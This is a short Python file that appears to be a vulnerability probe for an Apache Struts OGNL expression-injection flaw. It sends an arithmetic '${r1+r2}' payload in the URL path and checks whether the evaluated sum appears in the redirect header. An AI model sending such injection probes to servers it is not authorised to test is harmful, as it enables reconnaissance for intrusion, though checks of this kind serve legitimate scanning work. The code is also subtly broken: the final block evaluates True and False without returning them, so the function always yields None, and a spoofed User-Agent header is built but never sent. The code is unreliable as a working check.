import random
import requests
from urllib import parse
import logging


def apache_struts(url: str, verify: bool = True, timeout: int | float = 10):

    try:

        retval = False
        headers = dict()
        headers['User-Agent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0'
        r1 = random.randint(10000,99999)
        r2 = random.randint(10000,99999)
        r3 = r1 + r2

        urlOne = url

        res = requests.get(url=urlOne, timeout=timeout, allow_redirects=False, verify=verify)

        if res.status_code == 200:

            urlTemp = parse.urlparse(urlOne)

            urlTwo = urlTemp.scheme + '://' + urlTemp.netloc + '/${%s+%s}/help.action'%(r1,r2)
            res = requests.get(url=urlTwo, timeout=timeout, allow_redirects=False, verify=verify)

            if res.status_code == 302 and res.headers.get('Location') is not None and str(r3) in res.headers.get('Location'):
                urlThree = res.headers.get('Location')
                retval |= str(r3) in urlThree

    except Exception as e:
        logging.error(e)
    finally:

        if retval:
            True

        else:
            False